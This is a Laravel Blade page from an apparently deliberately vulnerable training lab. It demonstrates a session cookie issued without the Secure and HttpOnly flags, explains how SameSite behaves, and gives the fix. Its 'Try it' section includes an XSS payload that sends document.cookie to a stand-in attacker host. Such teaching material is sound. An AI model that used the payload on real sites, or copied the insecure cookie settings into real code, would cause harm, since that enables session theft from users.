@extends('layout')
@section('title', 'Insecure Cookie Config')

@section('content')
    <h2>Insecure Cookie Configuration</h2>
    <p class="subtitle">A05:2021 — Security Misconfiguration</p>

    <div class="vuln-banner">
        <strong>Vulnerability:</strong> This page issues a session-style token cookie with <code>secure = false</code> and
        <code>httpOnly = false</code>. It travels over plain HTTP, and because <code>HttpOnly</code> is off, any injected
        script can read it with <code>document.cookie</code>.
        <br><br>
        <strong>Vulnerable code:</strong> <code>-&gt;cookie('lab_session', $token, 120, '/', null, false, false)</code>
        <br><br>
        <strong>Try it:</strong> Open the browser console and run <code>document.cookie</code> — <code>lab_session</code> is
        right there in plaintext. Now chain it with the stored XSS on <a href="/xss">/xss</a>: a comment containing
        <code>&lt;script&gt;fetch('//attacker/?c='+document.cookie)&lt;/script&gt;</code> exfiltrates it from every visitor.
        <br><br>
        <strong>Why the value is readable:</strong> Laravel encrypts response cookies by default, so a real
        <code>lab_session</code> would reach the browser as <code>eyJpdiI6...</code> ciphertext and <code>document.cookie</code>
        would yield nothing useful. This lab lists <code>lab_session</code> in <code>encryptCookies(except: [...])</code> in
        <code>bootstrap/app.php</code> so the fixture behaves the way it is described. That exception is the lab's doing —
        the framework default is the safe one.
        <br><br>
        <strong>What SameSite does and does not do:</strong> the cookie <em>does</em> carry <code>SameSite=Lax</code> — Laravel's
        <code>CookieJar</code> stamps it from <code>config('session.same_site')</code> onto every cookie it issues, so you get it
        whether you asked for it or not. It is not a rescue here: <code>SameSite</code> governs whether the browser
        <em>attaches</em> a cookie to cross-site requests, which blunts CSRF. It does nothing about a script running on this
        origin <em>reading</em> the value. Only <code>HttpOnly</code> stops that.
        <br><br>
        <strong>Fix:</strong> <code>-&gt;cookie('lab_session', $token, 120, '/', null, true, true)</code> — <code>secure = true</code>
        keeps it off plaintext HTTP, <code>httpOnly = true</code> puts it out of JavaScript's reach.
    </div>

    <div class="output">Set-Cookie: lab_session={{ $token }}; expires={{ now()->addMinutes(120)->toRfc7231String() }}; Max-Age=7200; path=/; samesite=lax
                (no Secure, no HttpOnly — SameSite=Lax comes from the session config, not from this call)</div>
@endsection
